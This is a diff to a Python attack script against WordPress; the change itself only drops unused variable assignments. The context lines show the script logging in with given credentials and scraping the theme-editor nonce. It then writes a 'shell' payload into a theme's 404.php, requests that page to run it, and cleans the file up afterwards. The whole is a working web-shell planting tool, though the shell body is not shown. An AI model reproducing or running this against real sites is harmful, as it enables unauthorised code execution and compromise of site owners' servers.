@@ -12,7 +12,7 @@ def WP_Login():
             'pwd':options.passwd,
             'wp-submit':'Log in'
             }
-    r = s.post(options.target + '/wp-login.php', data=data, allow_redirects=False)
+    s.post(options.target + '/wp-login.php', data=data, allow_redirects=False)
     r = s.get(options.target + '/wp-admin/theme-editor.php?file=404.php&theme=' + options.theme, cookies=s.cookies)
     nonce_value= re.search('name=\"nonce"\s+value=\"\w{10}"', r.text).group().split('\"')[3]
     return nonce_value
@@ -48,7 +48,7 @@ def Load_Shell(nonce):
             'theme':options.theme,
             'newcontent':shell,
             }
-    r = s.post(options.target + '/wp-admin/admin-ajax.php', cookies=s.cookies, data=data)
+    s.post(options.target + '/wp-admin/admin-ajax.php', cookies=s.cookies, data=data)
 
 def Execute_Shell():
     requests.get(options.target + '/wp-content/themes/' + options.theme + '/404.php')
@@ -64,7 +64,7 @@ def Clean_Shell(nonce):
             'theme':options.theme,
             'newcontent':no_shell,
             }
-    r = s.post(options.target + '/wp-admin/admin-ajax.php', cookies=s.cookies, data=data)
+    s.post(options.target + '/wp-admin/admin-ajax.php', cookies=s.cookies, data=data)
 
 parser = OptionParser()
 parser.add_option("--target", help="URL for base wordpress install (ex: http://domain.com/wordpress)",dest="target")
